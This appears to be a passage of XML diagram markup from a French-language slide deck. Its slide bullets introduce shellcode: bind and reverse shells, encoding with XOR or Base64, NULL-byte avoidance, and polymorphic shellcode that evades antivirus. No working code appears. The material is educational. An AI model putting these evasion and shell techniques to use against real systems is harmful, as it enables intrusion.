        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1373261"/>
          <a:ext cx="5334000" cy="1260617"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-502537"/>
            <a:satOff val="-311"/>
            <a:lumOff val="2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Outil conçu pour automatiser l'analyse des firmwares IoT.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="61538" y="1434799"/>
        <a:ext cx="5210924" cy="1137541"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1E4239EF-9D65-4D47-92AE-5FD84F57BE0D}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2700119"/>
          <a:ext cx="5334000" cy="1260617"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-1005073"/>
            <a:satOff val="-621"/>
            <a:lumOff val="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Combine plusieurs outils comme Binwalk, QEMU, et d'autres scripts personnalisés.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="61538" y="2761657"/>
        <a:ext cx="5210924" cy="1137541"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B69366A5-EF21-8E49-8AC3-1023C09F12B5}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4026977"/>
          <a:ext cx="5334000" cy="1260617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Objectif :Rendre l’analyse des firmwares plus rapide et accessible.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="61538" y="4088515"/>
        <a:ext cx="5210924" cy="1137541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4CD979-6FE5-F343-AA7B-F62D0900C401}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="384419"/>
          <a:ext cx="533400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3A0C19-D269-2943-9136-DEEE23465FEB}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="118739"/>
          <a:ext cx="3733799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Définition et explications</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="144678"/>
        <a:ext cx="3681921" cy="479482"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{5C400156-2FCE-024D-A603-08723439D8AB}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1200899"/>
          <a:ext cx="5334000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74904" rIns="41397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Code machine compact injecté dans un programme vulnérable pour exécuter une commande ou un exploit.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1200899"/>
        <a:ext cx="5334000" cy="1247400"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{650A70BC-7F10-7745-84C2-70197B0C1977}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="935219"/>
          <a:ext cx="3733799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Définition :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="961158"/>
        <a:ext cx="3681921" cy="479482"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{22414C4A-4B00-B449-90BB-C0F320A8B717}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2811179"/>
          <a:ext cx="5334000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74904" rIns="41397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Le terme provient des codes initiaux utilisés pour ouvrir un shell (ex. : bash, cmd).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2811179"/>
        <a:ext cx="5334000" cy="1020600"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{4815005B-E46F-8A4A-A616-4252EB4CA96A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2545499"/>
          <a:ext cx="3733799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Origine du terme :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="2571438"/>
        <a:ext cx="3681921" cy="479482"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{7B3AE627-0078-BA40-BC40-705B21E3CD90}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4194659"/>
          <a:ext cx="5334000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74904" rIns="41397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Dans les attaques de buffer overflow ou les RCE.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="4194659"/>
        <a:ext cx="5334000" cy="1020600"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{C76993A6-1902-FD48-922E-AB28AC18A33A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="3928979"/>
          <a:ext cx="3733799" cy="5313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Utilisation courante :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="3954918"/>
        <a:ext cx="3681921" cy="479482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1DEAD1-BD63-324C-A695-5E4D2BDA2819}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1224186"/>
          <a:ext cx="5334000" cy="14064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95732" rIns="41397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Élever les privilèges.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Prendre le contrôle d’un système.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Installer des backdoors.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1224186"/>
        <a:ext cx="5334000" cy="1406475"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{DE8445C9-EF95-4949-A860-85F6488F9F49}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="943747"/>
          <a:ext cx="3733799" cy="5608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Applications dans les exploits :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="294080" y="971127"/>
        <a:ext cx="3679039" cy="506119"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B943E213-DD8B-5748-8DE3-6066FB954A5C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3013701"/>
          <a:ext cx="5334000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95732" rIns="41397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 dirty="0"/>
            <a:t>Taille </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1900" kern="1200" dirty="0" err="1"/>
            <a:t>compacte</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1900" kern="1200" dirty="0"/>
            <a:t> (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1900" kern="1200" dirty="0" err="1"/>
            <a:t>ou</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1900" kern="1200" dirty="0"/>
            <a:t> pas).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Peut contourner des protections en restant furtif.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3013701"/>
        <a:ext cx="5334000" cy="1376550"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8822A204-797B-8443-89B7-C370F8E044DF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2733262"/>
          <a:ext cx="3733799" cy="560879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Atout des shellcodes :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="294080" y="2760642"/>
        <a:ext cx="3679039" cy="506119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3E442F-989D-6F43-9E37-3DA0F8DF154C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="604942"/>
          <a:ext cx="5334000" cy="7095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54076" rIns="41397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S'exécute sur une machine déjà compromise.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="604942"/>
        <a:ext cx="5334000" cy="709537"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{BC6F2F79-968C-B74B-A4CE-F3AAE371B5DB}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="354022"/>
          <a:ext cx="3733799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1. Shellcode local :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="291198" y="378520"/>
        <a:ext cx="3684803" cy="452844"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{52B5B9AE-7129-A744-BBF3-B928908A47EE}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1657199"/>
          <a:ext cx="5334000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02537"/>
              <a:satOff val="-311"/>
              <a:lumOff val="25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54076" rIns="41397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Injecté dans une machine distante via des failles.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1657199"/>
        <a:ext cx="5334000" cy="963900"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B3C989DD-ED6E-2B43-A851-7824994DE895}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="1406279"/>
          <a:ext cx="3733799" cy="501840"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-502537"/>
            <a:satOff val="-311"/>
            <a:lumOff val="2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2. Shellcode distant :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="291198" y="1430777"/>
        <a:ext cx="3684803" cy="452844"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F582540E-B8E1-A841-B2CB-1A0FED7A6609}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2963819"/>
          <a:ext cx="5334000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005073"/>
              <a:satOff val="-621"/>
              <a:lumOff val="50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54076" rIns="41397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Ouvre un port sur la machine cible pour un accès distant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2963819"/>
        <a:ext cx="5334000" cy="963900"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{E46ED8CF-05AB-B34B-8738-71569373E6C8}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2712899"/>
          <a:ext cx="3733799" cy="501840"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-1005073"/>
            <a:satOff val="-621"/>
            <a:lumOff val="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3. Bind shell :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="291198" y="2737397"/>
        <a:ext cx="3684803" cy="452844"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{694A654D-8F3A-A742-81FB-3805CA6D0CA9}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4270439"/>
          <a:ext cx="5334000" cy="7095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54076" rIns="41397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La cible initie une connexion vers l’attaquant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="4270439"/>
        <a:ext cx="5334000" cy="709537"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8B1714A6-D320-384D-9E45-EBBFBB92C7A6}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="4019519"/>
          <a:ext cx="3733799" cy="50184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4. Reverse shell :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="291198" y="4044017"/>
        <a:ext cx="3684803" cy="45284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C2841-52E6-C242-8E94-F79CF9B5D16A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="463732"/>
          <a:ext cx="5334000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EF8AC-B4A5-5343-B185-5BA189C3FD36}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="153772"/>
          <a:ext cx="3733799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Différences principales :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="296962" y="184034"/>
        <a:ext cx="3673275" cy="559396"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{19FC573E-97C3-5F4B-9591-A52A3D86A0DA}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1416292"/>
          <a:ext cx="5334000" cy="1819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53805"/>
              <a:satOff val="-466"/>
              <a:lumOff val="38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437388" rIns="41397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Utilisation directe des appels système (syscalls).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Plus simple et plus compact (en general).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1416292"/>
        <a:ext cx="5334000" cy="1819125"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{D72AE237-9968-BB45-B8C1-3715E7EB24C4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="1106332"/>
          <a:ext cx="3733799" cy="619920"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-753805"/>
            <a:satOff val="-466"/>
            <a:lumOff val="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Linux :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="296962" y="1136594"/>
        <a:ext cx="3673275" cy="559396"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{A5348B05-8607-FB40-97BA-40034E8AE817}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3658777"/>
          <a:ext cx="5334000" cy="15214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437388" rIns="41397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Nécessite des appels API complexes.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Dépend des adresses mémoire dynamiques (ASLR).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3658777"/>
        <a:ext cx="5334000" cy="1521449"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{D2DAC597-A6AC-F942-847F-3EA06C364EC4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="3348817"/>
          <a:ext cx="3733799" cy="61992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Windows :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="296962" y="3379079"/>
        <a:ext cx="3673275" cy="55939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16EADE-5588-3641-88A8-44CA0663E1DD}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1161862"/>
          <a:ext cx="5334000" cy="1927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54076" rIns="41397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b="1" kern="1200"/>
            <a:t>Problème :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="1700" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="1700" kern="1200"/>
            <a:t>Les shellcodes contiennent souvent des caractères invalides (NULL, etc.).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b="1" kern="1200"/>
            <a:t>Solution :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="1700" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="1700" kern="1200"/>
            <a:t>Utilisation d’un encodage spécial pour contourner ces restrictions.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1161862"/>
        <a:ext cx="5334000" cy="1927800"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{55B0D7E6-9325-604A-B1D8-C3B90DE1135B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="910942"/>
          <a:ext cx="3733799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Pourquoi encoder les shellcodes ?</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="291198" y="935440"/>
        <a:ext cx="3684803" cy="452844"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1B7088A5-A4F0-DF41-9F17-DF13ED4E700B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3432382"/>
          <a:ext cx="5334000" cy="99067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54076" rIns="41397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XOR encoding.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Base64.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3432382"/>
        <a:ext cx="5334000" cy="990675"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{955C24C1-D9B6-8645-8271-5701D167BF1E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="3181462"/>
          <a:ext cx="3733799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Techniques courantes :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="291198" y="3205960"/>
        <a:ext cx="3684803" cy="45284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3EA0E-436A-A744-983A-8A14E416496F}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="326850"/>
          <a:ext cx="4571999" cy="11906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838" tIns="437388" rIns="35483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Ouvrir un port sur la cible pour y accéder.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="326850"/>
        <a:ext cx="4571999" cy="1190699"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1B1D3F02-FDDB-6840-947E-51F484BE5D2F}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="228599" y="16890"/>
          <a:ext cx="3200399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7" tIns="0" rIns="12096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But :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="258861" y="47152"/>
        <a:ext cx="3139875" cy="559396"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{EB9E70A2-6D0E-AC4B-982D-90177EDBBBED}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1940910"/>
          <a:ext cx="4571999" cy="1852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4838" tIns="437388" rIns="35483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Création du socket.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Bind au port.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Écoute et acceptation des connexions.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1940910"/>
        <a:ext cx="4571999" cy="1852200"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{CCE9B90D-2AA0-9140-9AD7-57835614303A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="228599" y="1630950"/>
          <a:ext cx="3200399" cy="6199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67" tIns="0" rIns="120967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Étapes principales :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="258861" y="1661212"/>
        <a:ext cx="3139875" cy="559396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89D07-F384-5444-A3CC-C6ECA4521762}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="650999"/>
          <a:ext cx="5334000" cy="194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583184" rIns="413978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/>
            <a:t>Un shellcode qui modifie sa signature pour éviter la détection par les antivirus.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="650999"/>
        <a:ext cx="5334000" cy="1940400"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{EEF82B96-9C11-524A-913F-0FD77B7C6146}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="237719"/>
          <a:ext cx="3733799" cy="8265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/>
            <a:t>Qu’est-ce que c’est ?</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="307049" y="278068"/>
        <a:ext cx="3653101" cy="745861"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{73FCECE8-5F24-D14C-86BD-327B96C060A5}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3155879"/>
          <a:ext cx="5334000" cy="194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583184" rIns="413978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800" kern="1200"/>
            <a:t>Ajouter des instructions inutiles ou modifier les séquences.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3155879"/>
        <a:ext cx="5334000" cy="1940400"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F0E401C6-A37E-1344-940A-11D2B2CF8B11}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2742599"/>
          <a:ext cx="3733799" cy="826559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/>
            <a:t>Technique :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="307049" y="2782948"/>
        <a:ext cx="3653101" cy="745861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7BCF0B-06F2-9B48-91C8-0C4EF94C3898}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1597799"/>
          <a:ext cx="5334000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74904" rIns="41397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Interruption de la chaîne de caractères lors de l’injection.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1597799"/>
        <a:ext cx="5334000" cy="1020600"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{7E0F583A-C4CE-724E-B85D-27DA84F3BFF4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="1332119"/>
          <a:ext cx="3733799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Pourquoi éviter les NULL bytes ?</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="1358058"/>
        <a:ext cx="3681921" cy="479482"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{A03F4655-8B06-DC4C-8C76-8F3A5949CE1E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2981279"/>
          <a:ext cx="5334000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74904" rIns="41397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Utiliser des instructions qui génèrent des valeurs sans NULL.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2981279"/>
        <a:ext cx="5334000" cy="1020600"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{677AB83F-B04D-3045-A601-91356C8615B9}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
